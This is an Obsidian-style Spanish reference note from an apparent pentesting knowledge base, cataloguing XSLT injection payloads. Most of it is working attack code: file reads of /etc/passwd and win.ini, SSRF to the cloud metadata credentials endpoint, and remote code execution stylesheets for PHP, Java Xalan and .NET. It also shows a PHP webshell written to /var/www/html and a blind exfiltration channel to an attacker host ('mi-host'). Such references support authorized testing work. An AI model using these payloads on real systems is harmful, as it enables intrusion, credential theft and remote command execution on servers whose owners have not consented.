---
tipo: meta
aliases:
  - payloads XSLT
  - XSLT RCE payloads
  - php:function XSLT
tags:
  - meta/referencia
  - dominio/web
---

# XSLT payloads - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué inyectar una vez identificado el procesador. Identificarlo es el paso previo, en [[XSLT - matriz de identificación]]; el criterio, en las dos notas de `600-tradecraft/`.

## 1. Divulgación de información

Ver [[XSLT - lectura y SSRF]]. Primero, siempre — decide todo lo demás.

```xml
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:value-of select="system-property('xsl:version')"/>
```

## 2. Lectura de archivos

**`document()`** — todos los procesadores con recursos externos:
```xml
<xsl:copy-of select="document('file:///etc/passwd')"/>
<xsl:value-of select="document('file:///etc/passwd')"/>
```

**`unparsed-text()`** — XSLT 2.0, lee texto plano (mejor para archivos no-XML):
```xml
<xsl:value-of select="unparsed-text('/etc/passwd')"/>
<xsl:value-of select="unparsed-text('file:///etc/passwd')"/>
```

Windows:
```xml
<xsl:value-of select="unparsed-text('C:\windows\win.ini')"/>
```

## 3. SSRF

```xml
<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
<xsl:copy-of select="document('http://interno:8080/admin')"/>
```

Sigue por [[MOC - SSRF]]: metadatos de instancia primero, red interna después.

## 4. Ejecución — PHP (libxslt)

Ver [[XSLT - ejecución por funciones de extensión]]. Requiere `registerPHPFunctions`:

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

En una expresión suelta:
```xml
<xsl:value-of select="php:function('system','id')"/>
<xsl:value-of select="php:function('passthru','id')"/>
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>
<xsl:value-of select="php:function('assert','system(\'id\')')"/>
```

## 5. Ejecución — Java (Xalan)

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtobj" select="rt:getRuntime()"/>
    <xsl:variable name="proc" select="rt:exec($rtobj,'id')"/>
    <xsl:value-of select="ob:toString($proc)"/>
  </xsl:template>
</xsl:stylesheet>
```

## 6. Ejecución — .NET

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="http://example.com">
  <msxsl:script implements-prefix="user" language="C#">
    <![CDATA[
    public string exec(string cmd){
      System.Diagnostics.Process p = new System.Diagnostics.Process();
      p.StartInfo.FileName = "cmd.exe";
      p.StartInfo.Arguments = "/c " + cmd;
      p.StartInfo.RedirectStandardOutput = true;
      p.StartInfo.UseShellExecute = false;
      p.Start();
      return p.StandardOutput.ReadToEnd();
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:exec('whoami')"/>
  </xsl:template>
</xsl:stylesheet>
```

## 7. Escritura de archivos

libxslt con `exsl:document` puede escribir, lo que da webshell si se escribe en la raíz web:
```xml
xmlns:exsl="http://exslt.org/common"
<exsl:document href="/var/www/html/shell.php" method="text">
  <xsl:text><![CDATA[<?php system($_GET[0]);?>]]></xsl:text>
</exsl:document>
```

Cruza con [[Webshell]] y [[Escritura de archivo en la raíz web]].

## 8. Canal ciego

Cuando no se refleja la salida — ver [[XSLT - matriz de identificación]] § 6:

```xml
<xsl:value-of select="document(concat('http://mi-host/?x=', system-property('xsl:vendor')))"/>
```

Exfiltra el resultado por la URL de un `document()` saliente. Mismo criterio que el canal ciego de [[SSTI payloads - matriz de referencia]] y [[Command injection ciego - matriz de referencia]].

## 9. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `php:function` da error de prefijo | Falta declarar `xmlns:php`, o `registerPHPFunctions` está off |
| El payload de Java no ejecuta | No es Xalan, o sin extensiones. Reidentificar |
| `msxsl:script` rechazado | El .NET tiene el scripting deshabilitado |
| `document()` bloqueado | Recursos externos off; sin lectura ni SSRF |
| `unparsed-text` no existe | XSLT 1.0; usar `document()` |
| Ejecuta y no vuelve nada | Salida no reflejada; canal ciego, § 8 |
| `exsl:document` no escribe | Sin permiso de escritura, o la extensión off |

## Relacionadas

[[MOC - XSLT injection]] · [[XSLT - matriz de identificación]] · [[SSTI payloads - matriz de referencia]] · [[XXE payloads - matriz de referencia]]
